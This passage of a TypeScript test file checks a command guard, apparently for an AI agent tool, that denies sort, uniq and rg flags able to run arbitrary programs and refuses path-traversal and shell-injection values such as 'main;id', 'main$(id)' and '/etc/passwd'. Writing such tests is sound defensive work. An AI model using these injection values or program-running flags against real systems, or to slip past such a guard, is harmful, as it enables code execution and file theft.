    ["sort -o out.txt in.txt", "read-only flag allowlist"],
    ["sort --compress-program=/tmp/pw.sh f", "read-only flag allowlist"],
    ["sort -z f", "read-only flag allowlist"],
    ["sort -no out f", "read-only flag allowlist"],
    ["uniq -o out f", "read-only flag allowlist"],
    ["uniq --zero-terminated f", "read-only flag allowlist"],
  ] as const) {
    assertDenied(command, reasonPart)
  }
})

test("rg refuses only the flags that run a program per file; its read-only surface passes", () => {
  assertDenied("rg --pre=/tmp/pw.sh pat f.txt", "--pre")
  assertDenied("rg --pre /tmp/pw.sh pat f.txt", "--pre")
  assertDenied("rg --pre-glob '!x' --pre /tmp/p.sh pat", "--pre")
  assertAllowed("rg pattern .")
  assertAllowed("rg -n --glob '*.ts' pattern tools/")
})

test("read-only inspection commands pass", () => {
  for (const command of [
    "cat package.json",
    "head -20 README.md",
    "wc -l tools/index.ts",
    "grep -rn guard tools/",
    "rg 'guardVerifyCommand' tools/",
    "test -f package.json",
    "echo wippa",
    "ls -la",
    "git status",
  ]) {
    assertAllowed(command)
  }
})

test("empty input is denied", () => {
  assertDenied("", "empty")
  assertDenied("   ", "empty")
})

// ----------------------------------------------------------- verify cwd

test("validateVerifyCwd accepts sane paths and refuses escapes", () => {
  for (const cwd of [".", "packages/web", "/var/tmp/wippaAGENT-p1", "..hidden", "a..b", "dir with spaces"]) {
    assert.equal(validateVerifyCwd(cwd), undefined, cwd)
  }
  for (const [cwd, part] of [
    ["../escape", "`..`"],
    ["a/../../b", "`..`"],
    ["sub/..", "`..`"],
    ["line\nbreak", "line breaks"],
    ["nul\0byte", "null bytes"],
  ] as const) {
    const error = validateVerifyCwd(cwd)
    assert.ok(error !== undefined, `${JSON.stringify(cwd)} must be refused`)
    assert.ok(error.includes(part), `${JSON.stringify(cwd)} → "${error}" should mention "${part}"`)
  }
})

// ----------------------------------------------------------- diff base

test("validateDiffBase accepts sane refs", () => {
  for (const base of ["main", "origin/main", "HEAD", "feat/p1-trust-model", "v1.0.1", "178fbc1", "@", "refs/heads/main"]) {
    assert.equal(validateDiffBase(base), undefined, base)
  }
})

test("validateDiffBase refuses paths, traversal, options and shell characters", () => {
  for (const [base, part] of [
    ["/etc/passwd", "absolute path"],
    ["C:\\Windows", "absolute path"],
    ["../../secrets", "`..`"],
    ["main..HEAD", "`..`"],
    ["-p", "`-`"],
    ["main;id", "plain git ref"],
    ["main|id", "plain git ref"],
    ["main$(id)", "plain git ref"],
    ["main name", "plain git ref"],
    ["main//x", "empty or `.` path segments"],
    ["main/", "empty or `.` path segments"],
    // Deliberate fail-closed choice: git accepts `HEAD~1` and `main^`, but
    // `~` and `^` are outside the plain-ref character set.
    ["HEAD~1", "plain git ref"],
    ["main^", "plain git ref"],
    ["x".repeat(256), "255 characters"],
  ] as const) {
    const error = validateDiffBase(base)
    assert.ok(error !== undefined, `${base} must be refused`)
    assert.ok(error.includes(part), `${base} → "${error}" should mention "${part}"`)
  }
})
